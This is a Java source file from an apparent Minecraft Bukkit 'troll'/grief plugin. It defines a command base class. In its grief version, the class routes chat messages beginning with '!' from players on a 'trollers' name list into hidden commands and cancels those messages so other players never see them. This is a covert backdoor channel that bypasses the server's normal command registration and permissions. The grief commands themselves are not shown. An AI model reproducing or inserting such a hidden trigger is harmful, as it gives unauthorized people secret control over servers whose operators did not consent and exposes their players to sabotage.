package PandaHexCode.Commands;

import java.util.ArrayList;

import org.bukkit.Bukkit;
import org.bukkit.Material;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

import PandaHexCode.PluginMain;

@SuppressWarnings("deprecation")
public class ChatCommand implements Listener, CommandExecutor{

public static ArrayList<String> allCommands = new ArrayList<String>();
public static ArrayList<ChatCommand> allCommandsC = new ArrayList<ChatCommand>();
	public String command = "";
	
	public Material helpMaterial = Material.PAPER;
	
	public ChatCommand(String command) {
		this.command = command;
		allCommands.add(command);
		allCommandsC.add(this);
		
		
		if(PluginMain.ISGRIEFVERSION)
			PluginMain.instance.getServer().getPluginManager().registerEvents(this, PluginMain.instance);
		else
			PluginMain.instance.getServer().getPluginCommand(command).setExecutor(this);
	}
	
	@EventHandler
	public void onChat(PlayerChatEvent e) {
		if(PluginMain.trollers.contains(e.getPlayer().getName()) && e.getMessage().startsWith("!"+command) && e.getMessage().contains(command)) {
			ArrayList<String> arg3 =  new ArrayList<String>();
			String[] split = e.getMessage().split(" ");
			for(int i = 1;i < split.length;i++) {
				arg3.add(split[i]);
			}
			
			try {
				onCommand((CommandSender)e.getPlayer(),null,command, arg3.toArray(new String[0]));
			}catch(Exception ex) {
				e.getPlayer().sendMessage(PluginMain.PR+"§4§lERROR: §c"+ex.getMessage());
			}
			
			for (Player pl : Bukkit.getOnlinePlayers()) {
				if(pl != e.getPlayer() && StandartArrayCommands.commandspy.targetPlayers.contains(pl.getName())) {
					pl.sendMessage("§7[§4§lCommandSpy§7] §e"+e.getPlayer().getName()+" §c> §e"+e.getMessage());
				}
			}
			e.setCancelled(true);
		}else if(PluginMain.trollers.contains(e.getPlayer().getName()) && e.getMessage().startsWith("!")) {
			e.setCancelled(true);
		}
	
	}
	
	public boolean onCommand(CommandSender arg0, Command arg1, String arg2, String[] arg3) {
		return false;
	}
	
}
